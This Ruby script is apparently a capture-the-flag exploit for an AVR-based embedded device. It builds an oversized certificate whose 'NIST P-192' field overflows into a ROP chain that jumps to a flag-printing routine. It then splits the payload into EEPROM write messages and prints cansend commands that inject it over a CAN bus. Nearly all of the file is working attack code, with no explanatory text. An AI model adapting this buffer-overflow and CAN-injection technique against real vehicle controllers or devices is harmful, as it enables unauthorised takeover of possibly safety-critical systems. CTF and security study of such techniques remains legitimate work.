#!/usr/bin/ruby

def dehex(string)
	string.split.map{|x| x.to_i(16).chr}.join
end
def xhelper(number, minLength)
	bytes = []
	while number>0 do
		bytes << '%02x'%[number % 256]
		number /= 256
	end
	if bytes.length < minLength then
		bytes += ['00'] * (minLength - bytes.length)
	end
	return bytes
end
def xx(number, minLength=1)
	bytes = xhelper(number, minLength)
	return bytes.reverse.join ' '
end
def le(number, minLength=1)
	bytes = xhelper(number, minLength)
	return bytes.join ' '
end
def hex(string)
	string.each_byte.map{|x| xx(x)}.join(' ')
end

# Structure
Magic = '30 ZZ'
# length
Riscar =  [0x80, hex('Riscar CA')]
$nist =    [0x81, hex('NIST P-192')]
Abba =    [0x82, 'ab ba 42 c0 ff ee 13 37']
EccKey =  [0x83, '04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 0d b7 26 7e']
Unknown = [0x84, 'd9 00 3c ac af 5b 93 5f 9f cb 0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d a8 34 fc 8e 21 02']
Parts = [Riscar, $nist, Abba, EccKey, Unknown]


# Payload
Padding = (1..90).each.map{|x| xx(x) }.join(' ')
Locals  = '4a 09 YY 08 9d 3e 3e 95' # four bytes to cross locals, + four more for cert pointer and saved sp
ROP = [
	xx(0x0079fb,3), # return to INT0_
	xx(0x210a),     # populate rx24
	'23 22 21 20',  # rx22, rx20
	xx(0x1337),     # populate rx18
	'00 00 00 00',  # RAMP bytes
	'80 44 00',     # SREG, r0 r1
	xx(0x003514,3), # return to sub_34e2 to get leet
	'ca fe ba be',  # pops
	xx(0x004e8f,3), # return to print_flag_or_die_4E8F
]

$nist[1] = [$nist[1], Padding, Locals, ROP].join(' ')

def makePayload()
	cert = Magic + ' ' + Parts.map { |part|
		length = part.last.split.length
		[xx(part.first), xx(length), part.last].join(' ')
	}.join(' ')
	totalLength = cert.split.length() - 2
	cert = cert.gsub(/ZZ/, xx(totalLength))
	cert = cert.gsub(/YY/, xx($nist.last.split.length))
	return cert
end

CERT_ADDR = 0x0040

def splitIntoWriteMessages(payload, maxMsgLen=50)
	messages = []
	address = CERT_ADDR
	payload.split.each_slice(maxMsgLen-5) do |slice|
		messages << ['3d 12', le(address, 2), xx(slice.length), slice.join(' ')].join(' ')
		address += slice.length
	end
	return messages
end

def canify(msg)
	bytes = msg.split
	first = xx(0x1000 + bytes.length).gsub(/ /,'')
	first += bytes.shift(6).join

	fragments = [first]
	(1..7).each do |i|
		data = bytes.shift(7)
		break if data.empty?

		fragment = xx(0x20 + i)
		fragment += data.join
		fragments << fragment
	end
	raise if not bytes.empty?
	return fragments
end

def hexPrint(bytes)
	bytes.split.each_with_index do |x,i|
		print x
		if ( (i+1) % 16 == 0)
			puts
		else
			print ' '
		end
	end
	puts
end

SID = '665'

#begin
	cert = makePayload()
	puts "Payload:"
	hexPrint(cert)
	puts

    # TODO: need write_eeprom wrapper
	messages = splitIntoWriteMessages cert, 37
	puts "EEPROM Write Messages:"
	messages.each {|msg| puts msg}
	puts

	puts "CAN Frames:"
	messages.each do |message|
		frames = canify(message)
		frames.each do |frame|
			puts "cansend can0 #{SID}##{frame.scan(/../).join('.')}"
		end
		puts "sleep 10"
	end
	puts
#end

